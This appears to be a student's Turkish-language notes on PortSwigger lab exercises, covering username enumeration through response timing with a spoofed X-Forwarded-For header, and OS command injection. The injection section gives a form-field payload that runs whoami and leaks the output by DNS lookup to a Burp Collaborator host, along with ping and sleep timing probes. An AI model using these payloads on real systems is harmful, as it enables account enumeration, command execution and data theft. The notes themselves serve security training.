# PORT SWIGGER NOTLARI


### LAB Notlarim:

__________________________________________
####  Username enumeration via response timing  [ Response timing ve response received ]

Burada oncelikle ```X-Forwarded-For:``` header i ekleyerek en alta ```0 - 600``` e kadar bir brute force ayarliyorum
ardindan parolayi bilerek yanlis yapiyorum ```testtttttttttttttttttt``` gibi bir parola koyuyorum.
username kismina ise wordlistimi ekleyerek pitchfork ile atagi baslatiyorum. receive ve response timing ile bakarak hani ilk bos bir sorgu gonderiyor
o sorgu senin kendi olusturdugun gercek bir hesabin dogru sifresi ve username i olsun. ondan referans almistim ben.

2054 olarak bos bir istek attiginda yani gercek giris yaptiginda bu sayi ile referansimizi aliyoruz.
username salidirisi bittigi zaman baktigimiz zaman bu 2 parametreye receive ve response timing e . 
Cok ama cok yakin bir deger goruoruz. username i bulmus olduk.
simdi ayni sekilde bu sefer parolaya ayni saldiriyi gerceklestiriyoruz.
saldiri bittiginde gordugumuz deger gercek degerdir.

_______________________________________________________________

### OS Command Injection 
```url
csrf=rNED41GCvbP8vgtXfK1rs4BGsTvbe11F&name=testerererere&email=tipybu%40cyclelove.cc||nslookup+`whoami`.oyqhkljtvxhzosoxlu4m9qtg87ey2n.oastify.com+#||&subject=testre&message=testssssss
```
Burada tirnak isareti farkli bunu unutma.
eng klavyede tab in usutndeki olacak whoami
bunun disinda `||ping+-c+10+127.0.0.1+||` bu 10 saniye falan bekletiyor guzel test. ama son lab da bekletmiyordu mesela. sadece su yukaridaki nslookup ve burp collabrator yaptigim kisimda tek bu yontem ise yaradi....
Ekstra olarak ping yerine `sleep 10` komutum da ise yaradi/
